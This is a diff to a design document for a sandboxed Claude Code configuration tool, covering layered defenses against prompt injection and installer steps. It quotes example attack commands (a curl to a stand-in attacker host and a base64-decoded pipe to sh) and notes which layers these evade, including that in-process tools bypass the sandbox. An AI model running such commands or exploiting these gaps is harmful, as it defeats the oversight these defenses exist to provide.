@@ -26,7 +26,7 @@ The copy firewall depends on a second rule: Claude never runs `install.sh`. An a
 
 **Small surface.** No plugins, no extension points, no runtime configuration protocol. The tool is a set of JSON files, shell scripts, and markdown docs. If you need a feature, write it directly.
 
-**Layered defense, honest claims.** Protections come from three layers: permission-string matching (catches deliberate invocations, defeatable via semantic equivalents), OS-level sandboxing (catches subprocess-level reads, writes, and network — not defeatable by allowed shell builtins), and Claude Code's built-in protections. The sandbox is load-bearing for the prompt-injection threat; the permission layer is for operator clarity and casual-damage prevention. `THREAT_MODEL.md` enumerates exactly which adversary models each layer addresses and which are out of scope, so the user can calibrate trust against auditable promises rather than an implicit "safe" label.
+**Layered defense, honest claims.** Protections come from three layers: permission-string matching (catches deliberate invocations, defeatable via semantic equivalents), OS-level sandboxing (catches subprocess-level reads, writes, and network — not defeatable by allowed shell builtins), and Claude Code's built-in protections. The sandbox is load-bearing for the prompt-injection threat at the *subprocess* level; Claude Code's own in-process tools (Read, Write, Edit) execute outside the sandbox and rely on the permission layer alone. The permission layer is for operator clarity, casual-damage prevention, and protection of the in-process tool channel. `THREAT_MODEL.md` enumerates exactly which adversary models each layer addresses and which are out of scope, so the user can calibrate trust against auditable promises rather than an implicit "safe" label.
 
 ## Profile and policy in detail
 
@@ -73,21 +73,25 @@ Scope enforcement comes from two other layers:
 
 This means `dev` by itself does not scope a session to the project. `dev` plus the default profile's sandbox plus being launched from the project root does. The `claude-dev` wrapper combines those three ingredients in one command.
 
-The sandbox is also the layer that addresses sophisticated attacks. Permission-string matching catches `curl attacker.example.com` but not `echo 'base64' | base64 -d | sh`; the sandbox catches both, because the decoded subprocess inherits the sandbox's network and filesystem denies. See `THREAT_MODEL.md` for the full enumeration.
+The sandbox is also the layer that addresses sophisticated attacks at the subprocess level. Permission-string matching catches `curl attacker.example.com` but not `echo 'base64' | base64 -d | sh`; the sandbox catches both, because the decoded subprocess inherits the sandbox's network and filesystem denies. The sandbox does *not* cover Claude Code's own in-process tools (Read, Write, Edit) — those run inside the host process and are governed only by the permission layer. See `THREAT_MODEL.md` for the full enumeration.
 
 ## Installation model
 
 `install.sh` performs these steps:
 
-1. Check every destination for existing content. If any of `~/.claude`, `~/.config/claude-config/claude-aliases.sh`, `~/.config/claude-config/policies/<name>.json`, or `~/.config/claude-config/profiles/default` already exists, the installer prints the conflicting paths to stderr and exits non-zero. There is no `--force` flag.
+1. Check every destination for existing content. If any of `~/.claude`, `~/.config/claude-config/claude-aliases.sh`, `~/.config/claude-config/policies/<name>.json`, `~/.config/claude-config/profiles/default`, or `~/.config/claude-config/scripts` already exists, the installer prints the conflicting paths to stderr and exits non-zero. There is no `--force` flag.
 2. Copy `claude-aliases.sh` to `~/.config/claude-config/claude-aliases.sh`.
 3. For each policy file, substitute `{{HOME}}` with the user's home directory and write to `~/.config/claude-config/policies/<name>.json`. Non-template policy files (`yolo.json`) are copied verbatim.
-4. Copy the default profile directly into `~/.claude/`. Substitute `{{PROFILE_DIR}}` with `$HOME/.claude` and `{{HOME}}` with the user's home directory when processing `settings.template.json`.
-5. Ensure hook scripts are executable.
-6. Create a convenience symlink at `~/.config/claude-config/profiles/default` pointing to `~/.claude`, so the multi-profile layout convention holds for docs and any future additional profiles.
-7. Print a reminder to source `claude-aliases.sh` from the user's shell rc.
+4. Copy management scripts to `~/.config/claude-config/scripts/` and make them executable.
+5. Copy the default profile directly into `~/.claude/`. Substitute `{{PROFILE_DIR}}` with `$HOME/.claude` and `{{HOME}}` with the user's home directory when processing `settings.template.json`.
+6. Ensure hook scripts are executable.
+7. Run `scripts/filter-sandbox-denies.py` against the generated `~/.claude/settings.json` to drop any `sandbox.filesystem.denyRead` entry that is a symlink, missing, or the wrong type. Bubblewrap fails closed if any denyRead entry cannot be mounted over; this filter prevents a confusing "every Bash subprocess fails" failure mode.
+8. Create a convenience symlink at `~/.config/claude-config/profiles/default` pointing to `~/.claude`, so the multi-profile layout convention holds for docs and any future additional profiles.
+9. Print a reminder to source `claude-aliases.sh` from the user's shell rc.
 
-The installer is deliberately simple: check, copy, substitute, symlink. No dependency installation, no service registration, no shell-rc editing. Every path it touches is owned by the user; no `sudo` is required.
+The installer is deliberately simple: check, copy, substitute, filter, symlink. No dependency installation, no service registration, no shell-rc editing. Every path it touches is owned by the user; no `sudo` is required.
+
+The session wrappers in `claude-aliases.sh` re-run `filter-sandbox-denies.py` on every launch, so a system change between sessions (a credential path becoming a symlink, a directory replaced by a file, or a path disappearing) cannot silently degrade the sandbox into "fails closed for every subprocess." The filter is silent on success and tolerant of missing dependencies (`python3` absent or the script not yet installed).
 
 ### Why refuse rather than overwrite
 
